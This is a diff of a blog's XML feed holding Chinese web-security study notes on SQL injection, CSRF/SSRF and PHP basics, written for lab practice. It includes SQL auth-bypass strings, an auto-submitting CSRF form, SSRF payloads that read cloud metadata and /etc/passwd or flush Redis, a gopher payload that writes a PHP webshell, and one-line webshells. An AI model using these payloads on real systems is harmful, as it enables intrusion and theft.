-10. SQL 注入漏洞10.1 万能密码漏洞根源$sql = &quot;SELECT * FROM users WHERE name=&#x27;$name&#x27; AND password=&#x27;$pwd&#x27;&quot;;
-
-
-直接将用户输入拼接到 SQL 语句的单引号中执行
-未检查&#x2F;过滤特殊字符（如 &#39;、OR、# 等），也未做转义处理
-攻击者可输入恶意字符篡改 SQL 逻辑
-
-攻击原理攻击者输入 123&#39; or &#39;1&#39;=&#39;1，实现 3 个关键操作：
-
-闭合原有 SQL 语句的单引号，打破查询限制
-添加 &#39;1&#39;=&#39;1&#39; 恒成立条件，让查询条件永远为真
-注释多余内容，避免 SQL 语法错误
-
-篡改后的 SQL 对比原正常 SQL：
-SELECT * FROM users WHERE name=&#x27;admin&#x27; AND password=&#x27;123&#x27;
-
-篡改后 SQL：
-SELECT * FROM users WHERE name=&#x27;admin&#x27; AND password=&#x27;123&#x27; or &#x27;1&#x27;=&#x27;1&#x27;
-
-无论账号密码是否正确，数据库都会返回所有用户信息，实现免密绕过。
-SELECT * FROM users WHERE name=&#x27;admin&#x27; or 1=1#&#x27; AND password=&#x27;123&#x27;
-
-10.2 CTF 注入常用语句核心系统库：information_schemaMySQL 自带系统字典库，储存所有数据库名、表名、字段名，注入查表必备。
-
-
-
-系统表
-存储内容
-
-
-
-schemata
-所有数据库信息
-
-
-tables
-所有数据表信息
-
-
-columns
-所有字段（列）信息
-
-
-
-
-
-关键字段
-含义
-
-
-
-schema_name
-数据库名
-
-
-table_schema
-表所属的数据库
-
-
-table_name
-数据表名
-
-
-column_name
-字段（列）名
-
-
-常用注入语句
-查看当前库、版本
-
-SELECT DATABASE();SELECT VERSION();
-
-
-查询所有数据库
-
-SELECT schema_name FROM information_schema.schemata;
-
-
-查询当前库所有表
-
-SELECT table_name FROM information_schema.tables WHERE table_schema = database();
-
-
-查询指定表所有字段
-
-SELECT column_name FROM information_schema.columns WHERE table_name = &#x27;表名&#x27;;
-
-
-探测字段数量
-
-ORDER BY 1;ORDER BY 2;-- 不报错代表存在，报错即为最大列数
-
-
-批量拼接爆库&#x2F;表&#x2F;字段
-
--- 爆出当前库所有表SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = database();-- 爆出指定表所有字段SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = &#x27;表名&#x27;;
-
-
-查询表内真实数据
-
-SELECT 字段1, 字段2 FROM 表名;SELECT * FROM 表名 LIMIT 0, 1;
-
-
-本文为个人学习笔记，如有错误或疏漏，欢迎批评指正。
-
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>SQL</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PHP特性利用之MD5</title>
     <url>/2026/06/22/PHP-MD5%E7%89%B9%E6%80%A7%E5%88%A9%E7%94%A8/index/</url>
     <content><![CDATA[一、[Bugku CTF] MD51. 题目
@@ -2083,6 +1826,926 @@ robots.txt
       </categories>
       <tags>
         <tag>CTF</tag>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CSRF与SSRF漏洞</title>
+    <url>/2026/06/08/CSRF-SSRF/index/</url>
+    <content><![CDATA[一、CSRF（跨站请求伪造）1. 简介与危害
+全称：Cross-site request forgery，跨站请求伪造，也叫one-click attack
+原理：攻击者伪造请求，欺骗已登录用户点击，利用浏览器自动携带Cookie的特性，以用户身份执行未授权操作
+危害：可实现转账、修改密码、修改个人信息、新增管理员等敏感操作
+
+2. 工作原理
+用户登录目标网站，浏览器存储认证Cookie（含sessionid）
+服务器仅通过Cookie验证用户身份
+攻击者诱导用户访问恶意页面&#x2F;链接，浏览器自动携带Cookie发送请求
+服务器误认为是用户本人操作，执行恶意请求
+
+
+
+3. 攻击前提条件
+存在CSRF漏洞
+用户已登录目标网站
+攻击者了解请求协议包
+浏览器支持Cookie自动携带
+用户点击恶意链接&#x2F;页面
+
+4. Pikachu靶场实战4.1 CSRF(GET)攻击步骤
+登录账号：kobe&#x2F;123456
+
+
+
+
+
+
+抓包获取修改信息的请求URL
+
+
+
+
+
+
+GET &#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;kobe&amp;phonenum&#x3D;1&amp;add&#x3D;1&amp;email&#x3D;1%40pikachu.com&amp;submit&#x3D;submit HTTP&#x2F;1.1
+
+
+构造恶意HTML页面（script&#x2F;img&#x2F;form标签）
+
+&lt;script src=&quot;http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=4&amp;phonenum=4&amp;add=4&amp;email=4@pikachu.com&amp;submit=submit&quot;&gt;&lt;/script&gt;hello
+
+
+上传至恶意服务器，诱导用户访问
+
+
+
+
+用户访问后，信息被悄无声息篡改
+
+
+
+4.2 CSRF(POST)攻击
+
+
+利用Burp Suite生成CSRF PoC表单页面
+
+
+
+
+
+构造恶意HTML页面，修改电话号码为 999999 放到恶意服务器上
+&lt;html&gt;  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;  &lt;body&gt;    &lt;form action=&quot;http://127.0.0.1/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot; method=&quot;POST&quot;&gt;      &lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;aaa&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;phonenum&quot; value=&quot;999999&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;add&quot; value=&quot;111&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;1&amp;#64;pikachu&amp;#46;com&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;    &lt;/form&gt;    &lt;script&gt;      history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;);      document.forms[0].submit();    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;
+
+
+诱导已登录用户访问，自动提交POST请求完成攻击
+
+
+
+
+
+5. 自动化工具
+Burp Suite：拦截请求→Action→Generate CSRF PoC→生成HTML攻击页面
+OWASP CSRFTester：代理端口默认8008，拦截请求→修改参数→生成HTML（GET选IMG，POST选Forms）
+
+
+设置好代理（和 bp 一样的）
+
+
+
+
+
+
+
+
+
+6. 防御方法6.1 用户层面
+不点击恶意链接、不访问可疑网站
+关键网站使用后及时退出登录
+关键操作进行二次验证（短信、邮件、人脸识别）
+
+6.2 开发层面同源策略：让关键操作只来自自身域名的请求，不接受跨域请求
+
+CSRF Token：服务端会话生成随机Token，请求携带并验证
+验证来源：服务端检查Referer&#x2F;Origin头，确保请求来自可信域
+双重提交Cookie：客户端与服务器同时校验Token
+请求方法限制：敏感操作服务端只接受 POST&#x2F;PUT&#x2F;DELETE，禁用GET
+SameSite Cookie：设置为Strict&#x2F;Lax，限制跨站Cookie发送
+
+
+补充：
+1、 SameSite Cookie 是什么
+SameSite 是 Cookie 的一个属性，用来告诉浏览器：跨站请求时，要不要把 Cookie 带过去。它有三个值：Strict、Lax、None，其中前两个是 CSRF 防御的核心。
+2、SameSite=Strict
+
+规则：任何跨站请求，都不携带 Cookie
+不管是点击链接、提交表单，还是 &lt;img&gt;&#x2F;&lt;script&gt; 跨站请求，只要不是在当前域名的页面里发起的，Cookie 都不会带过去。
+
+
+效果：CSRF 攻击完全没法用，因为浏览器根本不会把用户的认证 Cookie 传给目标网站。
+缺点：用户体验差。比如你从别的网站点链接跳过来，Cookie 不携带，会直接变成“未登录状态”。
+
+3、SameSite=Lax（浏览器默认值）
+
+规则：只允许“安全的导航型GET请求”携带Cookie
+✅ 允许：用户主动点击跨站链接、地址栏输入地址这种导航式GET请求，会带Cookie。
+❌ 禁止：跨站的POST表单提交、&lt;img&gt;&#x2F;&lt;script&gt;&#x2F;&lt;iframe&gt; 自动发起的请求，不会带Cookie。
+
+
+效果：既防住了绝大多数 CSRF 攻击（因为CSRF常用POST或自动GET请求），又不影响用户正常跳转体验。
+适用场景：绝大多数网站的默认配置，平衡安全和体验。
+
+
+
+二、SSRF（服务器请求伪造）1. 简介与危害
+全称：Server-Side Request Forgery，服务器请求伪造
+原理：攻击者构造请求，由服务端发起请求，访问内网&#x2F;本地资源
+核心特点：服务端可访问外网无法触及的内网系统
+
+2. 业务场景
+远程图片加载、URL采集、在线翻译、文件读取等
+服务端未校验用户传入的URL，导致恶意请求被执行
+
+3. 攻击利用方式常用四类协议：http/https、file、dict、gopher，权限与攻击能力逐级增强。
+
+内网文件读取：file://
+内网网页扫描&#x2F;云元数据：http://
+简单端口探测、单行数据库命令：dict://
+SSRF最高权限、内网RCE、完整协议攻击：gopher://
+
+3.1 HTTP &#x2F; HTTPS（最基础，通用探测）3.1.1 作用对内网存活扫描、端口探测、内网Web服务访问、读取内网接口数据、绕过前端访问内网后台。
+3.1.2 利用方式
+内网端口扫描
+
+http://127.0.0.1:3306http://192.168.1.1:8080
+
+通过页面超时&#x2F;报错差异判断端口开放。
+
+访问内网管理后台
+
+http://127.0.0.1/adminhttp://169.254.169.254/latest/meta-data  # AWS云服务器元数据泄露
+
+
+内网HTTP接口攻击
+
+对内网未授权接口发起GET&#x2F;POST请求，增删改数据。
+内网 HTTP 接口一般是：内网后台、管理系统、API、微服务、监控面板、容器管理、运维工具（Jenkins、Nacos、Consul、K8s ApiServer）。  
+常见攻击场景：
+场景 1：读取内网后台敏感数据
+内网存在管理后台 http://127.0.0.1:8080/user/list，未做鉴权，直接返回全部用户账号密码。 SSRF Payload：
+http://漏洞网站/ssrf.php?url=http://127.0.0.1:8080/user/list
+
+漏洞服务器会访问这个内网接口，把用户列表返回到页面。
+场景 2：调用内网高危修改接口（越权操作）
+内网接口 http://192.168.0.10:9000/admin/del_user?id=1 可删除管理员账号。 我们无法在外网直接访问，但 SSRF 可以代为发送 GET 请求，删除账号。
+场景 3：内网微服务 API 漏洞利用
+企业内网微服务之间无认证，接口支持新增管理员、上传文件、执行命令：
+
+Nacos：未授权接口可新增账号、配置泄露；
+Jenkins：内网接口可构建任务执行命令；
+K8s ApiServer：内网未授权可接管全部容器；
+SpringBoot Actuator：&#x2F;env、&#x2F;shutdown、&#x2F;heapdump 泄露配置、关闭服务。
+
+Payload 示例（读取 SpringBoot 配置）：
+http://xxx/ssrf?url=http://127.0.0.1:8090/actuator/env
+
+
+
+场景 4：云服务器内网元数据接口（SSRF 内网 HTTP 攻击）
+阿里云 &#x2F; AWS 内网存在特殊 HTTP 接口 169.254.169.254，外网无法访问，内网服务器可直接调取密钥、账号凭证：
+http://xxx/ssrf?url=http://169.254.169.254/latest/meta-data/
+
+拿到云服务器密钥，可直接接管整台云主机。
+场景 5：内网文件上传接口 getshell
+内网有上传接口 http://127.0.0.1:8081/upload，无校验可传 php 木马，通过 SSRF 间接访问上传地址写入 webshell。
+3.1.3 局限只能发送标准HTTP请求，无法自定义TCP原始报文；不能操作非Web协议（Redis&#x2F;Mysql&#x2F;FTP）。
+3.2 file 协议（读取本地文件，文件读取漏洞）3.2.1 作用读取服务器本地任意文件，获取配置、密钥、源码、账号密码。
+3.2.2 利用Payloadfile:///etc/passwd        # Linux 用户列表file:///C:/Windows/System32/drivers/etc/hosts  # Windows hostsfile:///www/config.php    # 网站数据库配置文件
+
+3.2.3 限制
+仅读文件，不能写文件；
+部分PHP&#x2F;Java环境会过滤file://协议；
+无法操作网络服务，只针对本地磁盘。
+
+3.3 dict 协议（探测TCP端口、简单命令交互）3.3.1 作用主动向任意TCP端口发送自定义单行数据，探测端口指纹、简单数据库交互。
+3.3.2 语法格式dict://ip:port/自定义数据
+3.3.3 常见利用场景
+Redis 简单命令执行（单行指令）
+
+dict://127.0.0.1:6379/SET test 123dict://127.0.0.1:6379/FLUSHDB
+
+
+Mysql 端口探测、发送探测语句
+
+dict://127.0.0.1:3306/select user();
+
+
+端口指纹识别向端口发送测试字符，根据返回内容判断服务类型（Redis&#x2F;Mongo&#x2F;Mysql）。
+
+3.3.4 短板只能发送单行字符串，不支持多行、复杂交互协议（Redis写shell需要多行报文，dict无法完成）。
+3.4 gopher 协议3.4.1 核心优势支持完整自定义TCP数据流，多行报文、二进制数据，可攻击绝大多数内网TCP服务，SSRF漏洞利用天花板。
+3.4.2 标准格式gopher://ip:port/_URLEncode后的TCP报文下划线 _ 代表TCP报文起始位置，所有换行、特殊字符必须URL编码。
+3.4.3 利用场景（1）Redis 写WebShell（多行指令）原始报文：
+set shell &quot;&lt;?php eval($_GET[cmd]);?&gt;&quot;config set dir /var/www/htmlconfig set dbfilename shell.phpsave
+
+编码后payload：
+gopher://127.0.0.1:6379/_%0D%0Aset%20shell%20%22%3C%3Fphp%20eval(%24_GET%5Bcmd%5D)%3B%3F%3E%22%0D%0Aconfig%20set%20dir%20/var/www/html%0D%0Aconfig%20set%20dbfilename%20shell.php%0D%0Asave%0D%0A
+
+（2）攻击Mysql、PostgreSQL、FTP完整构造登录、查询、建表报文，无需客户端。
+（3）内网FastCGI攻击（PHP-FPM RCE）构造FastCGI协议原始数据包，直接远程代码执行。
+（4）内网Memcache、Zookeeper、Tomcat 未授权访问3.4.4 补充
+换行必须用 %0d%0a（CRLF）；
+部分语言（PHP）gopher默认不支持https，仅TCP；
+可绕过简单端口过滤、内网IP限制。
+
+3.5 对比
+
+
+协议
+核心能力
+适用场景
+缺陷
+
+
+
+http&#x2F;https
+发起HTTP请求，内网Web扫描
+后台探测、云元数据读取
+仅HTTP，无法操作TCP服务
+
+
+file
+读取服务器本地文件
+拿配置、密码、源码
+无网络操作能力
+
+
+dict
+单行TCP数据发送
+端口探测、简单Redis单命令
+不支持多行协议报文
+
+
+gopher
+自定义完整多行TCP原始数据包
+Redis写shell、FastCGI RCE、所有内网TCP服务攻击
+报文需要手动URL编码，构造复杂
+
+
+4. 危害
+内网端口扫描
+内网Web应用指纹识别
+攻击内网应用
+读取服务器本地文件
+
+5. 实战案例5.1 自定义SSRF测试页面页面提供输入框，用户提交url参数，后端用curl在服务端访问传入的地址，输出响应内容。  
+&lt;!DOCTYPEHTMLPUBLIC&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;&lt;html&gt;&lt;head&gt;   &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;   &lt;title&gt;SSRF&lt;/title&gt;&lt;/head&gt;&lt;body&gt;远程图片加载器&lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;    请输入图片地址：&lt;input type=&#x27;text&#x27; name=&#x27;url&#x27;&gt;   &lt;input type=&#x27;submit&#x27; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;?php   if(isset($_POST[&#x27;url&#x27;]))&#123;      $url = $_POST[&#x27;url&#x27;];      $ch=curl_init();      curl_setopt($ch,CURLOPT_URL,$url);      curl_setopt($ch,CURLOPT_HEADER,false);      curl_exec($ch);      curl_close($ch);   &#125;?&gt;
+
+
+
+payload：
+
+HTTP 协议：内网 &#x2F; 本机端口探测
+
+http://127.0.0.1
+
+
+
+
+file 协议：读取服务器本地敏感文件（高危）
+
+file:///C:/Windows/System32/drivers/etc/hosts
+
+
+
+5.2 YzmCMS靶场靶场源码下载：
+.gitee-file{display:flex;align-items:center;gap:14px;padding:16px 18px;margin:16px 0;  border:1px solid #e5e7eb;border-radius:12px;background:#fff;text-decoration:none!important;  transition:box-shadow .25s,transform .25s;color:inherit}.gitee-file:hover{box-shadow:0 6px 24px rgba(0,0,0,.1);transform:translateY(-2px)}.gitee-file .gf-icon{width:44px;height:44px;border-radius:8px;background:#f0f7ff;flex-shrink:0;  display:flex;align-items:center;justify-content:center;color:#5b9bd5}.gitee-file .gf-body{flex:1;min-width:0}.gitee-file .gf-name{font-weight:600;font-size:15px;color:#1f2937;line-height:1.3}.gitee-file .gf-sub{font-size:13px;color:#6b7280;margin-top:3px}.gitee-file .gf-arrow{color:#9ca3af;flex-shrink:0}[data-theme=dark] .gitee-file{background:#1e1e1e;border-color:#333}[data-theme=dark] .gitee-file .gf-name{color:#e5e7eb}[data-theme=dark] .gitee-file .gf-sub{color:#9ca3af}[data-theme=dark] .gitee-file .gf-icon{background:#2a2a2a}
+
+  
+    
+  
+  
+    Yzmcms.zip
+    Gitee 文件 · 点击打开下载
+  
+  
+    
+  
+
+
+如果要重新安装，请删除 cache&#x2F;install.lock！  
+
+
+实操步骤：
+
+搭建靶场
+
+yzmcms\common\config\config.php
+
+
+访问http://127.0.0.1/ssrf/yzmcms/install.php
+
+
+
+
+
+
+
+
+
+进入后台
+
+访问  http://127.0.0.1/ssrf/yzmcms/admin/index/login.html
+账号  yzmcms  
+密码  yzmcms 
+
+
+
+
+
+构造恶意网页，放到网站根目录
+
+
+
+&lt;ssrf&gt;&lt;a href=&quot;file:///C:/Windows/System32/drivers/etc/hosts&quot;&gt;查看hosts文件&lt;/a&gt;&lt;/ssrf&gt;
+
+
+
+
+利用采集功能
+
+
+
+
+
+http://192.168.23.1/yzm/ssrf.html	# 192.168.23.1 是我本机的IP地址
+
+
+
+
+
+流程：
+
+
+6. 漏洞成因服务端提供外部数据获取功能，但未对目标地址做过滤与限制
+7. 防御方法① 禁止访问内网网段IP
+禁止访问的内网网段：回环段 127.0.0.0/8、私网A类 10.0.0.0/8、私网B类 172.16.0.0/12、私网C类 192.168.0.0/16。
+重点：不能只用字符串匹配过滤 127.0.0.1，攻击者可用简写&#x2F;十进制&#x2F;十六进制&#x2F;八进制IP绕过：
+
+
+简写：127.1
+十进制：2130706433
+十六进制：0x7f000001
+八进制：0177.0.0.1
+
+
+正确防护逻辑：先解析URL拿到目标域名，DNS解析出真实IP，再判断IP网段，所有变形IP解析后都会还原标准内网IP，全部拦截。
+
+② 协议白名单限制，仅允许 HTTP&#x2F;HTTPS
+只放行 http://、https:// 两种网页协议；
+直接禁用高危协议，从根源杜绝读取本地文件、攻击内网服务：file://（读服务器本地文件）、ftp://、dict://、gopher://（内网Redis&#x2F;MySQL命令执行）。
+
+③ 统一错误返回信息，消除端口探测差异
+漏洞风险：访问开放端口和关闭端口时，页面报错、响应时长、状态码不同，攻击者可根据差异扫描内网端口。
+防御手段：无论访问成功、失败、超时，全站返回完全一致的通用错误页面，屏蔽响应差异，无法判断端口是否开放。
+
+④ 过滤返回内容，校验响应数据格式
+业务场景：远程图片加载、网页采集功能；
+校验规则：
+
+
+图片功能：仅接收jpg&#x2F;png&#x2F;gif图片二进制，过滤文本、配置源码；
+网页采集：过滤数据库账号、服务器路径、内网地址等敏感内容；
+
+
+效果：即使前面过滤被绕过，服务器也不会把hosts、网站配置等敏感信息回显给攻击者。
+
+⑤ 限制请求端口范围仅开放业务必需的80、443网页端口，拦截3306(MySQL)、6379(Redis)、21(FTP)、22(SSH)等高危内网端口。
+⑥ 关闭URL自动重定向配置curl&#x2F;请求函数禁止跟随跳转，防止攻击者构造跳转域名，跳转至内网IP绕过第一层过滤。
+⑦ 域名二次DNS校验（防御DNS重绑定绕过）攻击者利用DNS短时间切换公网IP&#x2F;内网IP绕过网段检测；防护：域名解析两次，两次解析IP都必须为公网IP才允许请求。
+⑧ 部署独立代理服务转发请求不直接用业务服务器发起网络请求，通过独立隔离的外网代理服务器访问目标地址，业务主机无法直接触达内网资产。
+
+三、CSRF、XSS、SSRF核心区别
+
+
+维度
+XSS
+CSRF
+SSRF
+
+
+
+攻击发起方
+客户端（浏览器执行恶意 JS）
+客户端（用户浏览器）
+服务端（服务器主动发起网络请求）
+
+
+攻击目标
+登录用户、浏览器会话
+外网 Web 网站业务接口
+服务器本地、内网资产
+
+
+利用核心
+恶意脚本注入并执行
+跨域请求自动携带用户 Cookie
+服务端可控 URL 转发请求
+
+
+能力特点
+窃取 Cookie、劫持账号、钓鱼
+冒用用户身份操作，无法拿 Cookie
+读取本地文件、扫描内网、攻击内网服务
+
+
+核心防护方案
+输入转义过滤、CSP、Cookie 设 HttpOnly
+CSRF Token、SameSite、来源 Referer 校验
+协议白名单、内网 IP 拦截、端口限制
+
+
+
+四、总结Q1：CSRF 是什么？跨站请求伪造
+Q2：SSRF 是什么？服务端请求伪造
+Q3：CSRF 和 XSS 的区别是什么？CSRF 是跨站请求伪造，XSS 是跨站脚本攻击
+XSS利用的核心是窃取 cookie，直接使用 cookie 登录受害者账号；CSRF 利用的核心是诱导欺骗，不会获取受害者的信息，而是诱导受害者自己去执行某些恶意操作。
+Q4：CSRF 的危害？盗号：诱导受害者修改自己的密码，修改自己的绑定手机号，发送敏感信息
+改个人信息：诱导受害者修改自己的头像、个性签名、改自己的昵称
+诱导受害者执行命令
+Q5：如何挖 CSRF 漏洞？CSRF 一般无需白盒测试（代码审计），只有黑盒测试。
+Q6：同源策略是什么？浏览器默认的安全配置，不同源的两个网站之间不能互相读写资源，如 cookie 无法读取，XHR（XMLhttprequest，Ajax，axios）无法发送
+Q7：同源网站是什么？两个网站，协议一样，端口一样，域名和 IP 一样，就称为两个网站为同源。
+Q8：jsonp 跨域漏洞是什么？jsonp 跨域漏洞的产生原因是因为没有注意敏感信息，直接用 jsonp 传输了敏感数据。
+Q9：CORS跨域漏洞是什么？CORS 跨域漏洞的产生原因是因为没有注意敏感信息，直接用 CORS 传输了敏感数据。
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>CSRF</category>
+      </categories>
+      <tags>
+        <tag>CSRF</tag>
+        <tag>SSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP基础安全</title>
+    <url>/2026/06/22/PHP%E5%9F%BA%E7%A1%80%E5%AE%89%E5%85%A8/index/</url>
+    <content><![CDATA[一、什么是PHP?1. 定义PHP(全称:PHP: Hypertext Preprocessor,超文本预处理器)是一门开源的服务器端脚本编程语言, 专门用于开发Web网站的后端逻辑。
+2. 核心关键词
+服务器端：PHP代码只在远程服务器上运行,永远不会在用户的电脑浏览器中运行;用户的电脑只能看到PHP运行后返回的结果(网页、图片、文字等),看不到PHP源码。
+脚本语言：无需编译,服务器上的PHP引擎可以直接解析执行,开发&#x2F;运行效率高,这也是绝大多数 网站选择PHP做后端的核心原因。
+Web专属：PHP天生为网站开发而生,专门处理网站的后台业务逻辑,是目前全球使用量最高的 Web后端语言。
+
+3. PHP在网站中的角色网站的组成分为「前端」和「后端」,两者分工明确,缺一不可:
+
+前端(HTML&#x2F;CSS&#x2F;JS):只负责「展示」,比如页面布局、按钮样式、图片显示,运行在用户电脑,决定网站「长什么样」。
+后端(PHP):网站的核心大脑,只负责「处理业务逻辑」,运行在服务器,决定网站「能做什么」。
+
+PHP负责处理网站所有的核心操作:
+
+验证用户的账号密码是否正确,判断能否登录;
+接收用户上传的文件、表单信息,并处理&#x2F;保存;
+操作数据库,实现数据的增删改查(比如存储用户信息、文章内容);
+处理用户的所有请求,返回对应的结果给前端。
+
+4. PHP执行条件
+可访问
+可解析
+已知文件位置
+
+
+二、为什么学PHP?1. PHP的市场占比极高,是漏洞重灾区在国内,80%以上的中小型网站、论坛、政务系统、企业平台的后端都是基于PHP开发(比如Discuz论坛、织梦CMS、帝国CMS、各类商城网站)。我们做渗透测试、挖漏洞,绝大多数的目标网站都是PHP开发的,不懂PHP,就看不懂网站的运行逻辑,更看不懂漏洞的成因。
+2. 不懂PHP,看不懂漏洞的底层原理所有的Web漏洞(文件上传、SQL注入、XSS、代码执行、文件包含),针对PHP网站的占比超过 70%。
+
+比如:文件上传漏洞就是PHP代码写的不严谨导致的;
+比如:SQL注入就是PHP接收参数时没有过滤导致的;
+比如:WebShell能生效,本质就是PHP的函数执行逻辑被利用。
+
+只学工具、不学PHP原理,永远是「知其然不知其所以然」,永远成不了合格的网安工程师,只能做「脚本小子」。
+3. 不懂PHP,看不懂漏洞的利用方式我们挖漏洞的核心是「找到代码的缺陷」,渗透测试的核心是「利用代码的缺陷」。如果连PHP的基础语法、参数接收、函数作用都看不懂,就算找到了漏洞,也不知道怎么利用; 就算拿到了WebShell,也不知道怎么操作。
+4. PHP是网安入门最友好的后端语言PHP语法简单、易懂、贴近自然语言,相比于Java、Python、Go,PHP的入门成本最低,我们只需要学「网安相关的PHP基础」,不需要学完整的开发体系,就能满足渗透测试的需求,性价比极高。
+
+三、PHP核心基础语法1. PHP的标签风格一句话木马：&lt;?php eval($_POST[&#39;x&#39;]);?&gt; 有时候会遇到过滤标签 &lt;?php，直接上传会被拦截，可使用其他 PHP 标签绕过过滤。
+(1) 标准标签
+&lt;?phpecho &quot;111&quot;;?&gt;
+
+适用：所有PHP环境,开发、代码审计标准写法,必须掌握。
+(2) 短标签
+&lt;?echo &quot;短标签&quot;;?&gt;
+
+限制：需在php.ini开启short_open_tag,很多服务器默认禁用,不推荐生产使用。
+(3) ASP风格标签
+&lt;%echo &quot;ASP标签&quot;;%&gt;
+
+限制：需配置开启,现在基本淘汰,渗透很少遇见。
+(4) Script脚本标签
+&lt;script language=&quot;php&quot;&gt;echo &quot;script标签&quot;;&lt;/script&gt;
+
+老旧写法,现代环境基本废弃。
+2. PHP变量(1) 变量的定义
+PHP中,变量是用来存储数据的容器,比如存储文件的保存路径、存储用户上传的文件名、存储接收的参数等。
+(2) 变量的核心规则
+
+变量必须以 $ 开头,比如：$name、$upload_dir、$file_name；
+变量名区分大小写,比如 $name 和 $Name 是两个不同的变量；
+变量可以直接赋值,不需要提前声明类型,PHP会自动识别。
+
+$upload_dir = &#x27;./uploads/&#x27;;  // 存储文件保存目录，字符串类型$age = 20;                   // 存储数字，数值类型
+
+(3) 常用变量场景
+在漏洞代码中,最常见的PHP变量就是文件上传相关的：$upload_dir（文件保存目录）、$file_name（文件名）、$file_path（文件完整路径）。
+3. 常见输出函数(1) echo
+用于输出数字、字符串、布尔值等单一基础数据类型,无返回值,使用频率最高。
+echo 123;echo &quot;hello&quot;;echo true;
+
+补充：PHP单、双引号字符串解析
+单引号 &#39;&#39;：不会解析字符串内的$变量,不会转换\n、\t等转义符,仅能转义\&#39;和\\。
+$str = &quot;hello&quot;;echo &#x27;内容：$str&#x27;;// 输出：内容：$str
+
+双引号 &quot;&quot;：自动解析$变量并替换为变量值,支持\n、\t、\&quot;等全部转义字符。
+$str = &quot;hello&quot;;echo &quot;内容：$str&quot;;// 输出：内容：hello
+
+(2) print_r()
+专门打印数组、对象等复合类型数据,可清晰展示内部结构,调试代码常用。
+print_r($_FILES);
+
+4. PHP字符串拼接(1) 拼接规则
+PHP中,拼接两个字符串（比如把「保存目录」和「文件名」拼在一起得到完整路径）,使用英文点号 . 完成。
+$upload_dir = &#x27;./uploads/&#x27;;  // 定义文件保存目录$file_name = &#x27;test.php&#x27;;     // 定义文件名$file_path = $upload_dir . $file_name;  // 拼接得到完整路径：./uploads/test.php
+
+(2) 意义
+文件上传漏洞中,攻击者就是利用这个语法,通过篡改文件名,让恶意文件被拼接成合法路径保存到服务器,这是漏洞利用的核心环节。
+5. PHP超全局变量(1) 什么是超全局变量?
+
+「全局」：在PHP代码的任何位置都可以直接使用,不需要提前定义；
+「超」：PHP官方内置的变量,专门用来接收用户传递的各种数据,天生存在,直接调用即可。
+
+(2) 核心特点
+
+所有超全局变量都是大写的数组形式；
+专门用来接收「用户从浏览器传递给服务器的数据」；
+是后端接收前端参数的核心方式,也是所有Web漏洞的「数据入口」。
+
+(3) $_FILES 超全局变量——文件上传专属
+$_FILES 是PHP专门用来接收用户上传文件的所有信息的超全局变量,没有它就实现不了文件上传功能。
+
+核心语法：$_FILES[&#39;表单名称&#39;][&#39;属性名&#39;]
+核心属性：a. $_FILES[&#39;file&#39;][&#39;name&#39;]：获取用户上传文件的「原始文件名」,比如 头像.jpg、test.php；  i. 重点：这个值是攻击者可以随意篡改的!攻击者可以把恶意PHP文件改成 头像.jpg.php,伪装成图片,这是文件上传漏洞的核心利用点。b. $_FILES[&#39;file&#39;][&#39;tmp_name&#39;]：获取用户上传文件在服务器的「临时文件名+临时路径」；  i. 重点：这个值是PHP自动生成的,攻击者完全无法篡改、无法伪造,是PHP的安全机制,用来防止攻击者伪造文件上传。
+
+(4) $_GET 超全局变量——接收GET请求传递的参数
+$_GET 专门用来接收用户通过**「GET请求」**传递的所有数据,数据来自于浏览器地址栏的URL中。
+
+语法：$_GET[&#39;参数名&#39;]
+案例：访问网址 http://www.xxx.com/index.php?user=admin&amp;pwd=123,后端接收参数：
+
+$user = $_GET[&#x27;user&#x27;];  // 接收的值是 admin$pwd = $_GET[&#x27;pwd&#x27;];    // 接收的值是 123
+
+
+特点：参数在URL中可见,适合传递非敏感的查询数据。
+
+(5) $_POST 超全局变量——接收POST请求传递的参数
+$_POST 专门用来接收用户通过**「POST请求」**传递的所有数据,数据藏在请求体中,URL中不可见。
+
+语法：$_POST[&#39;参数名&#39;]
+案例：用户登录时输入账号密码,点击登录,后端接收参数：
+
+$user = $_POST[&#x27;username&#x27;];  // 接收账号$pwd = $_POST[&#x27;password&#x27;];  // 接收密码
+
+
+特点：适合传递敏感数据、大文件、表单信息,文件上传、登录、注册等所有核心操作,都用POST传参；
+重点：WebShell的核心代码中,100%会用到 $_POST,比如 $_POST[123],用来接收攻击者的恶意指令。
+
+6. PHP后端如何接收前端传递的参数?这是所有Web交互的核心,也是所有漏洞的起点：前端所有的数据,最终都会通过「超全局变量」被后端PHP接收并处理,没有第二种方式!
+
+接收GET请求的参数 → 用 $_GET
+场景：查询数据、搜索内容、分页等；
+语法：$变量名 = $_GET[&#39;参数名&#39;];
+
+
+接收POST请求的参数 → 用 $_POST
+场景：登录、注册、提交表单、文件上传的表单信息等；
+语法：$变量名 = $_POST[&#39;参数名&#39;];
+
+
+接收上传的文件信息 → 用 $_FILES
+场景：所有文件上传操作；
+语法：$文件名 = $_FILES[&#39;file&#39;][&#39;name&#39;];
+
+
